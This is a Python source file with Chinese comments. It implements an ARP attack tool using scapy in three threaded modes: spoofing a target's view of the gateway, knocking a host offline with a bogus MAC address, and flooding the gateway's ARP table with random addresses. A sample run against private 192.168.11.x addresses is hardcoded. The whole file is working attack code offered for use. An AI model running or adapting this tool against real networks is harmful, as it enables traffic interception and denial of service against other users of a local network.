# -*- coding = utf-8 -*-
# @TIME :  14:31
# @Author : 晓晓鲸鱼
# @File : arp.py
# @Software : PyCharm
# @脚本说明 : ARP欺骗

import threading
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import keyboard


class Arp:

    def __init__(self):
        self.stop = threading.Event()
        self.a = 0
        self.quit = 0   # 通过修改这个属性，来判断是否退出

    def __arp_deception(self, ip_way, ip_dst):
        """ARP欺骗"""
        arp = ARP(op="is-at", psrc=ip_way, pdst=ip_dst)
        while True:
            if keyboard.is_pressed('q'):    # 判断是否结束循环
                break
            self.a += 1     # 此结果可能有误差(为了提升效率没有用锁)
            send(arp, verbose=False)
            print(f"\r [*]  已发包 {self.a} 个", end="", flush=True)

    def __arp_attack_host(self, ip_way, ip_dst):
        """使目标主机断网"""
        arp = Ether(src="11:11:11:11:11:11")/ARP(op="is-at", hwsrc="11:11:11:11:11:11", psrc=ip_way, pdst=ip_dst)
        while True:
            if keyboard.is_pressed('q'):    # 判断是否结束循环
                break
            self.a += 1
            sendp(arp, verbose=False)
            print(f"\r [*]  已发包 {self.a} 个", end="", flush=True)

    def __arp_attack_way(self, ip_way):
        """填满网关的ARP表，使其其他包都是广播包"""
        while True:
            if keyboard.is_pressed('q'):    # 判断是否结束循环
                break
            arp = Ether(src=RandMAC())/ARP(op="is-at", hwsrc=RandMAC(), psrc=RandIP(), pdst=ip_way)
            self.a += 1
            sendp(arp, verbose=False)
            print(f"\r [*]  已发包 {self.a} 个", end="", flush=True)

    def start(self, ip_way, ip_dst, mode):
        if mode == "1":
            print("[ARP欺骗] Q结束")
            for i in range(5):
                t = threading.Thread(target=self.__arp_deception, args=(ip_way, ip_dst))
                t.start()
        if mode == "2":
            print("[ARP攻击 之 断网] Q结束")
            for i in range(5):
                t = threading.Thread(target=self.__arp_attack_host, args=(ip_way, ip_dst))
                t.start()
        if mode == "3":
            print("[ARP攻击 之 填满ARP表] Q结束")
            for i in range(5):
                t = threading.Thread(target=self.__arp_attack_way, args=(ip_way,))
                t.start()


if __name__ == '__main__':
    a = Arp()
    a.start("192.168.11.1", "192.168.11.12", "1")

    # input("[任意键结束]")
    # a.stop()
